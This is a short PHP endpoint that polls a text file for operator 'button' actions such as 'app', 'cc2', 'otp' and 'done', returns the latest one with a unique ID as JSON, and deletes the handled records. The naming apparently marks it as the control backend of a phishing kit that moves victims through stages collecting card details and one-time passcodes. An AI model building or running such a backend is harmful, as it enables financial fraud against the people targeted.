<?php

// Define the path to the responses file
$filePath = "button_responses.txt";

// Function to process the file and get the latest status and unique_id
function getLatestStatusAndUniqueId($filePath)
{
    if (!file_exists($filePath)) {
        return ["status" => "no_data", "unique_id" => null]; // Default response if the file doesn't exist
    }

    // Read the file content
    $content = file_get_contents($filePath);

    // Split into individual records
    $records = preg_split('/(?=Timestamp: )/', $content); // Split entries starting with "Timestamp: "

    $newContent = [];
    $status = "no_data";
    $unique_id = null;

    foreach ($records as $record) {
        $record = trim($record);
        if (empty($record)) {
            continue;
        }

        // Extract unique_id if it exists
        if (preg_match('/Unique_ID:\s*([^|]+)/', $record, $idMatches)) {
            $unique_id = trim($idMatches[1]);
        }

        // Parse the record for action
        if (preg_match('/Action: (.+)$/', $record, $actionMatches)) {
            $action = trim($actionMatches[1]);

            // Check for a valid action
            if (in_array($action, ["app", "app2", "cc2", "otp", "otp2", "done"])) {
                $status = $action; // Set the status to the first matching action
                continue; // Skip adding this line to the new content
            }
        }

        // Keep lines that are not processed
        $newContent[] = $record;
    }

    // Update the file without processed lines
    file_put_contents($filePath, implode(PHP_EOL, $newContent));

    return ["status" => $status, "unique_id" => $unique_id];
}

// Get the latest status and unique_id
$response = getLatestStatusAndUniqueId($filePath);

// Return the status and unique_id to the client
header('Content-Type: application/json');
echo json_encode($response);
?>
